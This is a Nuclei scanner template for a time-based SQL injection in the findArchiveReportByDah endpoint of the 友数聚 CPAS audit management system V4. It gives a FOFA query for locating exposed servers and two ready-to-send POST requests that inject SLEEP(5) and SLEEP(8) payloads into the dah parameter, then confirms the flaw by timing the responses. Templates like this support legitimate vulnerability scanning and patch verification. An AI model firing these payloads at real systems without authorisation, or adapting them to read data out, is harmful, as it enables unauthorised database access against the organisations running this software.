id: youshuju-cpas-v4-findarchivereportbydah-sqli
info:
  name: "友数聚CPAS审计管理系统V4 findArchiveReportByDah接口dah参数SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/cpasm4/static/cap/font/iconfont.css"
        友数聚CPAS审计管理系统V4的findArchiveReportByDah接口在处理dah参数时，存在未经充分过滤的SQL拼接行为。攻击者可通过构造特制输入字符串，利用该接口对后端数据库执行非授权查询操作。
  tags: 友数聚CPAS审计管理系统
http:
- raw:
  - |
    POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: text/plain, */*; q=0.01

    dah=1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
  - |
    POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: text/plain, */*; q=0.01

    dah=1' AND (SELECT * FROM (SELECT(SLEEP(8)))x) AND '1'='1
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
